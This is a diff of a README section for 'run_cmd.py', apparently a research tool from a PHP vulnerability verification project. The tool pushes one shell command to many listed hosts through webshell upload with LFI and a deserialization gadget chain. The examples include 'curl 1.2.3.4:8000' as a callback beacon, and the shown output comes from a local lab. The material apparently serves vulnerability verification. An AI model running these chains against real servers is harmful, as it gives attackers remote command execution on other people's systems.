@@ -303,28 +303,31 @@ commands.
 
 ## Command runner (`run_cmd.py`)
 
-Runs one command on every host in `urls.txt`, sequentially, trying each
-technique until one works. Simplest tool in the repo: one flag for the
-command, output-first, the connect-back beacon only as a fallback.
+Fire-and-forget: sends one command to every host in `urls.txt` through every
+technique and prints the HTTP status codes back. No listener, no output
+parsing, no success heuristics — just what the server answered.
 
 ```bash
-uv run run_cmd.py --cmd 'id' --docker p2s2-lab
-uv run run_cmd.py --cmd 'id; uname -sr' --beacon 'curl <IP_ADDRESS>:8000'
-uv run run_cmd.py --cmd 'id' --hosts targets.txt --a-lfi-path /vuln.php
+uv run run_cmd.py --cmd 'id'
+uv run run_cmd.py --cmd 'curl 1.2.3.4:8000' --hosts targets.txt
+uv run run_cmd.py --cmd 'id' --a-write-path /upload.php --a-lfi-path /vuln.php
 ```
 
-Order per host:
-1. chain C gadget, output via the `==PROOF==` echo / `--docker` proof file
-2. chain C gadget with the beacon as the command (blind)
-3. chain A webshell (filename injection) + LFI, marker then command output
-4. chain A webshell with the beacon as the command (blind)
-5. chain A one-shot matrix (6 wrappers x 2 vectors), marker then output
+```
+[*] http://127.0.0.1:18081
+      A /chainA/index.php -> /chainA/lfi.php?page  200/200 200/200 200/200 200/200 200/200 200/200
+      C /chainW/up.php -> /chainR/up.php  200/200 200/200
+```
 
-Endpoints are auto-probed unless given. `--docker` additionally reads the
-proof file. Exit code `0` only if the command ran on every host. Commands
-must be single-line; commands with double quotes automatically use the
-progress-value webshell (no filename truncation) instead of the filename
-vector.
+`POST/GET` pairs per attempt:
+- **chain A** — 5 wrappers (`system`, `shell_exec`, `passthru`, `exec`,
+  `popen`) through the filename vector (single-quote payloads), plus the
+  command raw through the progress-value vector, then the LFI include
+- **chain C** — the gadget with the raw command and with `system(...)`,
+  written via the php_serialize dir and triggered via the php dir
+
+Endpoints are auto-probed unless given. Chain B is not attempted — it is a
+local `unserialize()` memory-corruption primitive with no remote delivery.
 
 ## Findings from this verification (beyond the original research)
 
